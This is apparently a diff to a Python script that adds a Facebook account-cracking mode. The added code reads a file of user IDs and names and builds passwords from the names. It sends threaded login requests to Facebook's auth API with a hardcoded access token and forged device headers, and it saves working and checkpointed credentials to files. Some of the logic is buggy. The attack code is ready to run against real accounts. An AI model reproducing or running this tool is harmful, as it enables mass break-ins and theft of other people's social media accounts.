@@ -291,6 +291,8 @@ def menu():
                         elif xd in ['5','05']:
                                wx=('Js1oU99b67uGRsaKs88RB7')
                                os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()       
+                        elif xd in ['6','06']:
+                               main_crack()        
                         elif xd in ['0','00']:
                                 exit(' Thanks for use 🥰 ')
                         else:
@@ -714,6 +716,126 @@ def pasw(self):
         else:
             print('\nSelect Valid Option ...')
             self.pasw() 
+class main_crack():
+    def __init__(self):
+        self.id=[]
+    def crack(self,id):
+        global methods
+        os.system('clear')
+        print(logo)
+        self.file = input('Put File Name : ')
+        try:
+            self.id = open(self.file).read().splitlines()
+            self.pasw()
+        except FileNotFoundError:
+            print('Opps File Not Found ...')
+            time.sleep(2)
+            os.system('clear')
+            print(logo)
+            print('Try Again ...')
+            time.sleep(2)
+            main_crack().crack(id)
+            
+    def methodA(self, sid, name, psw):
+        try:
+            global oks,cps,loop
+            sys.stdout.write(f"\r {S}[PROX] {loop} | OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.flush()
+            fs = name.split(' ')[0]
+            try:
+                ls = name.split(' ')[1]
+            except:
+                ls = fs
+            loop+=1
+            for pw in psw:
+                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
+                ua = DEL_T()
+                ads = str(uuid.uuid4())
+                token = '350'+'685531728|62f8ce'+'9f74b12f84c123cc23437a4a32'
+                jz = random.choice(['28','29','210'])+''.join(random.choice(digits) for _ in range(2))
+                mac = str(uuid.uuid4()).replace('-','')[0:25]
+                sim_code = str(random.randint(2e4,4e4))
+                x_fb = str(random.randint(2e7,3e7))
+                device_id = str(uuid.uuid4())
+                data = {'adid': ads, 'email': sid, 'password': ps, 'cpl': 'true', 'credentials_type': 'password', 'error_detail_type': 'button_with_disabled', 'source': 'login', 'format': 'json', 'device_id': device_id, 'family_device_id': device_id, 'session_id': device_id, 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1', 'locale': 'bn_IN', 'client_country_code': 'IN', 'advertising_id': device_id, 'fb_api_req_friendly_name': 'authenticate'}
+                head = {'Connection': 'keep-alive', 'Authorization': f'OAuth {token}', 'Host': 'b-graph.facebook.com', 'x-fb-connection-bandwidth': x_fb, 'x-fb-net-hni': jz, 'X-fb-sim-hni': jz, 'X-FB-Connection-Quality': 'EXCELLENT', 'x-fb-connection-type': 'WIFI.LTE', 'X-Tigon-Is-Retry': 'False', 'User-Agent':ua , 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger', 'Content-Length': '530'}
+                q = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
+                if 'session_key' in q:
+                    print(f"\r{R} [PROX-OK] {sid} | {ps} {S}")
+                    oks.append(sid)
+                    open('/sdcard/PROX_OK.txt','a').write(sid+'|'+ps+'\n')
+                    break
+                elif 'checkpoint' in session.cookies.get_dict():
+                    print(f"\r{A} [PROX-CP] {sid} | {ps} {S}")
+                    cps.append(sid)
+                    open('/sdcard/PROX_CP.txt','a').write(sid+'|'+ps+'\n')
+                    break
+                else:
+                    continue
+                #time.sleep(31)
+            
+            loop+=1
+        except requests.exceptions.ConnectionError:
+             self.methodA(sid, name, ps)
+            
+
+
+            
+    def pasw(self):
+        os.system("clear")
+        print(logo)
+        print(f"\t{S} Passwords Menu")
+        print(47*'-')
+        print('[1] Crack With Choice Pass [First last,Etc]')
+        
+        print('[0] Back')
+        print(47*'-')
+        psw = input('Select Password: ')  
+        
+        
+        if psw =='1':
+            os.system("clear")
+            pw = []
+            print(logo)
+            print(f'{S} Put limit between 1 to 20')
+            sl = int(input('How many password do you want to add?: '))
+            os.system("clear")
+            print(logo)
+            print(f'{S} [Example: first123,last786,firstlast,last,ETC]')
+            print('')
+            if sl =='':
+                print('\n Put limit between 1 to 20')
+            elif sl > 20:
+                print('\nPassword limit Should Not Be Greater Than 20')
+            else:
+                for sr in range(sl):
+                    pw.append(input(f'Password {sr+1}: '))
+            os.system("clear")
+            print(logo)
+            print(f"\r{A}Use flight (airplane) mode before use {S}")
+            print(47*"-")
+            print(f'{S} Total IDs : %s ' % len(self.id))
+            print(f'{S} Cracking Started...')
+            print(47*"-")
+            with xerxxdtread(max_workers=30) as xerx69:
+                for zsb in self.id:
+                   try:
+                       uid, name = zsb.split('|')
+                       sz = name.split(' ')
+                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
+                           pwx =  pw
+                       else:
+                            pwx =  pw
+                            if 'methodA' in methods:
+                                xerx69.submit(self.methodA, uid, name, pwx)
+                            
+                   except:pass
+            result(oks,cps)
+        elif psw =='0':
+            exit()
+        else:
+            print('\nSelect Valid Option ...')
+            self.pasw()             
                            
 try:
         approval()
